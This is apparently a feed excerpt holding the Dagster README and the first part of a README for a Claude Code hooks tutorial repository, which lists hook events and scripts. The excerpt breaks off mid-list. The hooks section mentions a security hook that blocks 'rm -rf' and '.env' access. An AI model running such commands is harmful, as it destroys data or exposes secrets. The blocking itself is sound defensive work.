 &lt;a target="_blank" href="https://twitter.com/dagster" style="background:none"&gt; &lt;img src="https://img.shields.io/badge/twitter-dagster-blue.svg?labelColor=4F43DD&amp;amp;color=163B36&amp;amp;logo=twitter" /&gt; &lt;/a&gt; 
 &lt;a target="_blank" href="https://dagster.io/slack" style="background:none"&gt; &lt;img src="https://img.shields.io/badge/slack-dagster-blue.svg?labelColor=4F43DD&amp;amp;color=163B36&amp;amp;logo=slack" /&gt; &lt;/a&gt; 
 &lt;a target="_blank" href="https://linkedin.com/showcase/dagster" style="background:none"&gt; &lt;img src="https://img.shields.io/badge/linkedin-dagster-blue.svg?labelColor=4F43DD&amp;amp;color=163B36&amp;amp;logo=linkedin" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;p&gt;&lt;strong&gt;Dagster is a cloud-native data pipeline orchestrator for the whole development lifecycle, with integrated lineage and observability, a declarative programming model, and best-in-class testability.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;It is designed for &lt;strong&gt;developing and maintaining data assets&lt;/strong&gt;, such as tables, data sets, machine learning models, and reports.&lt;/p&gt; 
&lt;p&gt;With Dagster, you declare‚Äîas Python functions‚Äîthe data assets that you want to build. Dagster then helps you run your functions at the right time and keep your assets up-to-date.&lt;/p&gt; 
&lt;p&gt;Here is an example of a graph of three assets defined in Python:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import dagster as dg
import pandas as pd

from sklearn.linear_model import LinearRegression

@dg.asset
def country_populations() -&amp;gt; pd.DataFrame:
    df = pd.read_html("https://tinyurl.com/mry64ebh")[0]
    df.columns = ["country", "pop2022", "pop2023", "change", "continent", "region"]
    df["change"] = df["change"].str.rstrip("%").astype("float")
    return df

@dg.asset
def continent_change_model(country_populations: pd.DataFrame) -&amp;gt; LinearRegression:
    data = country_populations.dropna(subset=["change"])
    return LinearRegression().fit(pd.get_dummies(data[["continent"]]), data["change"])

@dg.asset
def continent_stats(country_populations: pd.DataFrame, continent_change_model: LinearRegression) -&amp;gt; pd.DataFrame:
    result = country_populations.groupby("continent").sum()
    result["pop_change_factor"] = continent_change_model.coef_
    return result
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The graph loaded into Dagster's web UI:&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img width="100%" alt="An example asset graph as rendered in the Dagster UI" src="https://raw.githubusercontent.com/dagster-io/dagster/master/.github/example-lineage.png" /&gt; &lt;/p&gt; 
&lt;p&gt;Dagster is built to be used at every stage of the data development lifecycle - local development, unit tests, integration tests, staging environments, all the way up to production.&lt;/p&gt; 
&lt;h2&gt;Quick Start:&lt;/h2&gt; 
&lt;p&gt;If you're new to Dagster, we recommend checking out the &lt;a href="https://docs.dagster.io"&gt;docs&lt;/a&gt; or following the hands-on &lt;a href="https://docs.dagster.io/etl-pipeline-tutorial/"&gt;tutorial&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Dagster is available on PyPI and officially supports Python 3.9 through Python 3.14.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install dagster dagster-webserver
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This installs two packages:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;dagster&lt;/code&gt;: The core programming model.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;dagster-webserver&lt;/code&gt;: The server that hosts Dagster's web UI for developing and operating Dagster jobs and assets.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;You can find the full Dagster documentation &lt;a href="https://docs.dagster.io"&gt;here&lt;/a&gt;, including the &lt;a href="https://docs.dagster.io/getting-started/quickstart"&gt;Quickstart guide&lt;/a&gt;.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Key Features:&lt;/h2&gt; 
&lt;p align="center"&gt; &lt;img width="100%" alt="image" src="https://raw.githubusercontent.com/dagster-io/dagster/master/.github/key-features-cards.svg?sanitize=true" /&gt; &lt;/p&gt; 
&lt;h3&gt;Dagster as a productivity platform&lt;/h3&gt; 
&lt;p&gt;Identify the key assets you need to create using a declarative approach, or you can focus on running basic tasks. Embrace CI/CD best practices from the get-go: build reusable components, spot data quality issues, and flag bugs early.&lt;/p&gt; 
&lt;h3&gt;Dagster as a robust orchestration engine&lt;/h3&gt; 
&lt;p&gt;Put your pipelines into production with a robust multi-tenant, multi-tool engine that scales technically and organizationally.&lt;/p&gt; 
&lt;h3&gt;Dagster as a unified control plane&lt;/h3&gt; 
&lt;p&gt;Maintain control over your data as the complexity scales. Centralize your metadata in one tool with built-in observability, diagnostics, cataloging, and lineage. Spot any issues and identify performance improvement opportunities.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Master the Modern Data Stack with integrations&lt;/h2&gt; 
&lt;p&gt;Dagster provides a growing library of integrations for today‚Äôs most popular data tools. Integrate with the tools you already use, and deploy to your infrastructure.&lt;/p&gt; 
&lt;br /&gt; 
&lt;p align="center"&gt; &lt;a target="_blank" href="https://dagster.io/integrations" style="background:none"&gt; &lt;img width="100%" alt="image" src="https://raw.githubusercontent.com/dagster-io/dagster/master/.github/integrations-bar-for-readme.png" /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;h2&gt;Community&lt;/h2&gt; 
&lt;p&gt;Connect with thousands of other data practitioners building with Dagster. Share knowledge, get help, and contribute to the open-source project. To see featured material and upcoming events, check out our &lt;a href="https://dagster.io/community"&gt;Dagster Community&lt;/a&gt; page.&lt;/p&gt; 
&lt;p&gt;Join our community here:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;üåü &lt;a href="https://github.com/dagster-io/dagster"&gt;Star us on GitHub&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üì• &lt;a href="https://dagster.io/newsletter-signup"&gt;Subscribe to our Newsletter&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üê¶ &lt;a href="https://twitter.com/dagster"&gt;Follow us on Twitter&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üï¥Ô∏è &lt;a href="https://www.linkedin.com/company/dagsterlabs/"&gt;Follow us on LinkedIn&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üì∫ &lt;a href="https://www.youtube.com/@dagsterio"&gt;Subscribe to our YouTube channel&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üìö &lt;a href="https://dagster.io/blog"&gt;Read our blog posts&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üëã &lt;a href="https://dagster.io/slack"&gt;Join us on Slack&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üóÉ &lt;a href="https://discuss.dagster.io"&gt;Browse Slack archives&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;‚úèÔ∏è &lt;a href="https://github.com/dagster-io/dagster/discussions"&gt;Start a GitHub Discussion&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;For details on contributing or running the project for development, check out our &lt;a href="https://docs.dagster.io/about/contributing"&gt;contributing guide&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;Dagster is &lt;a href="https://github.com/dagster-io/dagster/raw/master/LICENSE"&gt;Apache 2.0 licensed&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>disler/claude-code-hooks-mastery</title>
      <link>https://github.com/disler/claude-code-hooks-mastery</link>
      <description>&lt;p&gt;Master Claude Code Hooks&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Claude Code Hooks Mastery&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://docs.anthropic.com/en/docs/claude-code/hooks"&gt;Claude Code Hooks&lt;/a&gt; - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#claude-code-sub-agents"&gt;Claude Code Sub-Agents&lt;/a&gt;, the powerful &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#the-meta-agent"&gt;Meta-Agent&lt;/a&gt;, and &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#team-based-validation-system"&gt;Team-Based Validation&lt;/a&gt; with agent orchestration.&lt;/p&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/hooked.png" alt="Claude Code Hooks" style="max-width: 800px; width: 100%;" /&gt; 
&lt;h2&gt;Table of Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#prerequisites"&gt;Prerequisites&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#hook-lifecycle--payloads"&gt;Hook Lifecycle &amp;amp; Payloads&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#what-this-shows"&gt;What This Shows&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#uv-single-file-scripts-architecture"&gt;UV Single-File Scripts Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#key-files"&gt;Key Files&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#features-demonstrated"&gt;Features Demonstrated&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#hook-error-codes--flow-control"&gt;Hook Error Codes &amp;amp; Flow Control&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#userpromptsubmit-hook-deep-dive"&gt;UserPromptSubmit Hook Deep Dive&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#claude-code-sub-agents"&gt;Claude Code Sub-Agents&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#team-based-validation-system"&gt;Team-Based Validation System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#output-styles-collection"&gt;Output Styles Collection&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#custom-status-lines"&gt;Custom Status Lines&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Prerequisites&lt;/h2&gt; 
&lt;p&gt;This requires:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://docs.astral.sh/uv/getting-started/installation/"&gt;Astral UV&lt;/a&gt;&lt;/strong&gt; - Fast Python package installer and resolver&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://docs.anthropic.com/en/docs/claude-code"&gt;Claude Code&lt;/a&gt;&lt;/strong&gt; - Anthropic's CLI for Claude AI&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Optional Setup:&lt;/h3&gt; 
&lt;p&gt;Optional:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://elevenlabs.io/"&gt;ElevenLabs&lt;/a&gt;&lt;/strong&gt; - Text-to-speech provider (with MCP server integration)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://github.com/elevenlabs/elevenlabs-mcp"&gt;ElevenLabs MCP Server&lt;/a&gt;&lt;/strong&gt; - MCP server for ElevenLabs&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://www.firecrawl.dev/mcp"&gt;Firecrawl MCP Server&lt;/a&gt;&lt;/strong&gt; - Web scraping and crawling MCP server (my favorite scraper)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://openai.com/"&gt;OpenAI&lt;/a&gt;&lt;/strong&gt; - Language model provider + Text-to-speech provider&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://www.anthropic.com/"&gt;Anthropic&lt;/a&gt;&lt;/strong&gt; - Language model provider&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://ollama.com/"&gt;Ollama&lt;/a&gt;&lt;/strong&gt; - Local language model provider&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Hook Lifecycle &amp;amp; Payloads&lt;/h2&gt; 
&lt;p&gt;This demo captures all 13 Claude Code hook lifecycle events with their JSON payloads:&lt;/p&gt; 
&lt;h3&gt;Hook Lifecycle Overview&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-mermaid"&gt;flowchart TB
    subgraph SESSION["üü¢ Session Lifecycle"]
        direction TB
        SETUP[["üîß Setup&amp;lt;br/&amp;gt;(init/maintenance)"]]
        START[["‚ñ∂Ô∏è SessionStart&amp;lt;br/&amp;gt;(startup/resume/clear)"]]
        END[["‚èπÔ∏è SessionEnd&amp;lt;br/&amp;gt;(exit/sigint/error)"]]
    end

    subgraph MAIN["üîÑ Main Conversation Loop"]
        direction TB
        PROMPT[["üìù UserPromptSubmit"]]
        CLAUDE["Claude Processes"]

        subgraph TOOLS["üõ†Ô∏è Tool Execution"]
            direction TB
            PRE[["üîí PreToolUse"]]
            PERM[["‚ùì PermissionRequest"]]
            EXEC["Tool Executes"]
            POST[["‚úÖ PostToolUse"]]
            FAIL[["‚ùå PostToolUseFailure"]]
        end

        subgraph SUBAGENT["ü§ñ Subagent Lifecycle"]
            direction TB
            SSTART[["üöÄ SubagentStart"]]
            SWORK["Subagent Works"]
            SSTOP[["üèÅ SubagentStop"]]
        end

        NOTIFY[["üîî Notification&amp;lt;br/&amp;gt;(Async)"]]
        STOP[["üõë Stop"]]
    end

    subgraph COMPACT["üóúÔ∏è Maintenance"]
        PRECOMPACT[["üì¶ PreCompact"]]
    end

    SETUP --&amp;gt; START
    START --&amp;gt; PROMPT
    PROMPT --&amp;gt; CLAUDE
    CLAUDE --&amp;gt; PRE
    PRE --&amp;gt; PERM
    PERM --&amp;gt; EXEC
    EXEC --&amp;gt; POST
    EXEC -.-&amp;gt; FAIL
    CLAUDE -.-&amp;gt; SSTART
    SSTART --&amp;gt; SWORK
    SWORK --&amp;gt; SSTOP
    POST --&amp;gt; CLAUDE
    CLAUDE --&amp;gt; STOP
    CLAUDE -.-&amp;gt; NOTIFY
    STOP --&amp;gt; PROMPT
    STOP -.-&amp;gt; END
    PROMPT -.-&amp;gt; PRECOMPACT
    PRECOMPACT -.-&amp;gt; PROMPT
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;1. UserPromptSubmit Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Immediately when user submits a prompt (before Claude processes it)&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;prompt&lt;/code&gt; text, &lt;code&gt;session_id&lt;/code&gt;, timestamp&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Prompt validation, logging, context injection, security filtering&lt;/p&gt; 
&lt;h3&gt;2. PreToolUse Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Before any tool execution&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt; parameters&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Blocks dangerous commands (&lt;code&gt;rm -rf&lt;/code&gt;, &lt;code&gt;.env&lt;/code&gt; access)&lt;/p&gt; 
&lt;h3&gt;3. PostToolUse Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; After successful tool completion&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_response&lt;/code&gt; with results&lt;/p&gt; 
&lt;h3&gt;4. Notification Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code sends notifications (waiting for input, etc.)&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;message&lt;/code&gt; content&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; TTS alerts - "Your agent needs your input" (30% chance includes name)&lt;/p&gt; 
&lt;h3&gt;5. Stop Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code finishes responding&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;stop_hook_active&lt;/code&gt; boolean flag&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; AI-generated completion messages with TTS playback (LLM priority: OpenAI &amp;gt; Anthropic &amp;gt; Ollama &amp;gt; random)&lt;/p&gt; 
&lt;h3&gt;6. SubagentStop Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code subagents (Task tools) finish responding&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;stop_hook_active&lt;/code&gt; boolean flag&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; TTS playback - "Subagent Complete"&lt;/p&gt; 
&lt;h3&gt;7. PreCompact Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Before Claude Code performs a compaction operation&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;trigger&lt;/code&gt; ("manual" or "auto"), &lt;code&gt;custom_instructions&lt;/code&gt; (for manual), session info&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Transcript backup, verbose feedback for manual compaction&lt;/p&gt; 
&lt;h3&gt;8. SessionStart Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code starts a new session or resumes an existing one &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;source&lt;/code&gt; ("startup", "resume", or "clear"), session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Development context loading (git status, recent issues, context files)&lt;/p&gt; 
&lt;h3&gt;9. SessionEnd Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code session ends (exit, sigint, or error) &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;session_id&lt;/code&gt;, &lt;code&gt;transcript_path&lt;/code&gt;, &lt;code&gt;cwd&lt;/code&gt;, &lt;code&gt;permission_mode&lt;/code&gt;, &lt;code&gt;reason&lt;/code&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Session logging with optional cleanup tasks (removes temp files, stale logs)&lt;/p&gt; 
&lt;h3&gt;10. PermissionRequest Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When user is shown a permission dialog &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_use_id&lt;/code&gt;, session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Permission auditing, auto-allow for read-only ops (Read, Glob, Grep, safe Bash)&lt;/p&gt; 
&lt;h3&gt;11. PostToolUseFailure Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When a tool execution fails &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_use_id&lt;/code&gt;, &lt;code&gt;error&lt;/code&gt; object &lt;strong&gt;Enhanced:&lt;/strong&gt; Structured error logging with timestamps and full context&lt;/p&gt; 
&lt;h3&gt;12. SubagentStart Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When a subagent (Task tool) spawns &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;agent_id&lt;/code&gt;, &lt;code&gt;agent_type&lt;/code&gt;, session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Subagent spawn logging with optional TTS announcement&lt;/p&gt; 
&lt;h3&gt;13. Setup Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude enters a repository (init) or periodically (maintenance) &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;trigger&lt;/code&gt; ("init" or "maintenance"), session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Environment persistence via &lt;code&gt;CLAUDE_ENV_FILE&lt;/code&gt;, context injection via &lt;code&gt;additionalContext&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;What This Shows&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Complete hook lifecycle coverage&lt;/strong&gt; - All 13 hook events implemented and logging (11/13 validated via automated testing)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Prompt-level control&lt;/strong&gt; - UserPromptSubmit validates and enhances prompts before Claude sees them&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Intelligent TTS system&lt;/strong&gt; - AI-generated audio feedback with voice priority (ElevenLabs &amp;gt; OpenAI &amp;gt; pyttsx3)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Security enhancements&lt;/strong&gt; - Blocks dangerous commands and sensitive file access at multiple levels&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Personalized experience&lt;/strong&gt; - Uses engineer name from environment variables&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Automatic logging&lt;/strong&gt; - All hook events are logged as JSON to &lt;code&gt;logs/&lt;/code&gt; directory&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Chat transcript extraction&lt;/strong&gt; - PostToolUse hook converts JSONL transcripts to readable JSON format&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Team-based validation&lt;/strong&gt; - Builder/Validator agent pattern with code quality hooks&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; The &lt;code&gt;chat.json&lt;/code&gt; file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;UV Single-File Scripts Architecture&lt;/h2&gt; 
&lt;p&gt;This project leverages &lt;strong&gt;&lt;a href="https://docs.astral.sh/uv/guides/scripts/"&gt;UV single-file scripts&lt;/a&gt;&lt;/strong&gt; to keep hook logic cleanly separated from your main codebase. All hooks live in &lt;code&gt;.claude/hooks/&lt;/code&gt; as standalone Python scripts with embedded dependency declarations.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Benefits:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Isolation&lt;/strong&gt; - Hook logic stays separate from your project dependencies&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Portability&lt;/strong&gt; - Each hook script declares its own dependencies inline&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;No Virtual Environment Management&lt;/strong&gt; - UV handles dependencies automatically&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Fast Execution&lt;/strong&gt; - UV's dependency resolution is lightning-fast&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Self-Contained&lt;/strong&gt; - Each hook can be understood and modified independently&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree.&lt;/p&gt; 
&lt;h2&gt;Key Files&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;.claude/settings.json&lt;/code&gt; - Hook configuration with permissions&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/hooks/&lt;/code&gt; - Python scripts using uv for each hook type 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit.py&lt;/code&gt; - Prompt validation, logging, and context injection&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_tool_use.py&lt;/code&gt; - Security blocking and logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use.py&lt;/code&gt; - Logging and transcript conversion&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use_failure.py&lt;/code&gt; - Error logging with structured details&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;notification.py&lt;/code&gt; - Logging with optional TTS (--notify flag)&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;stop.py&lt;/code&gt; - AI-generated completion messages with TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_stop.py&lt;/code&gt; - Simple "Subagent Complete" TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_start.py&lt;/code&gt; - Subagent spawn logging with optional TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_compact.py&lt;/code&gt; - Transcript backup and compaction logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_start.py&lt;/code&gt; - Development context loading and session logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_end.py&lt;/code&gt; - Session cleanup and logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;permission_request.py&lt;/code&gt; - Permission auditing and auto-allow&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;setup.py&lt;/code&gt; - Repository initialization and maintenance&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;validators/&lt;/code&gt; - Code quality validation hooks 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;ruff_validator.py&lt;/code&gt; - Python linting via Ruff (PostToolUse)&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;ty_validator.py&lt;/code&gt; - Python type checking (PostToolUse)&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;utils/&lt;/code&gt; - Intelligent TTS and LLM utility scripts 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;tts/&lt;/code&gt; - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3) 
      &lt;ul&gt; 
       &lt;li&gt;&lt;code&gt;tts_queue.py&lt;/code&gt; - Queue-based TTS management (prevents overlapping audio)&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;llm/&lt;/code&gt; - Language model integrations (OpenAI, Anthropic, Ollama) 
      &lt;ul&gt; 
       &lt;li&gt;&lt;code&gt;task_summarizer.py&lt;/code&gt; - LLM-powered task completion summaries&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/status_lines/&lt;/code&gt; - Real-time terminal status displays 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;status_line.py&lt;/code&gt; - Basic MVP with git info&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v2.py&lt;/code&gt; - Smart prompts with color coding&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v3.py&lt;/code&gt; - Agent sessions with history&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v4.py&lt;/code&gt; - Extended metadata support&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v5.py&lt;/code&gt; - Cost tracking with line changes&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v6.py&lt;/code&gt; - Context window usage bar&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v7.py&lt;/code&gt; - Session duration timer&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v8.py&lt;/code&gt; - Token usage with cache stats&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v9.py&lt;/code&gt; - Minimal powerline style&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/output-styles/&lt;/code&gt; - Response formatting configurations 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;genui.md&lt;/code&gt; - Generates beautiful HTML with embedded styling&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;table-based.md&lt;/code&gt; - Organizes information in markdown tables&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;yaml-structured.md&lt;/code&gt; - YAML configuration format&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;bullet-points.md&lt;/code&gt; - Clean nested lists&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;ultra-concise.md&lt;/code&gt; - Minimal words, maximum speed&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;html-structured.md&lt;/code&gt; - Semantic HTML5&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;markdown-focused.md&lt;/code&gt; - Rich markdown features&lt;/li&gt; 
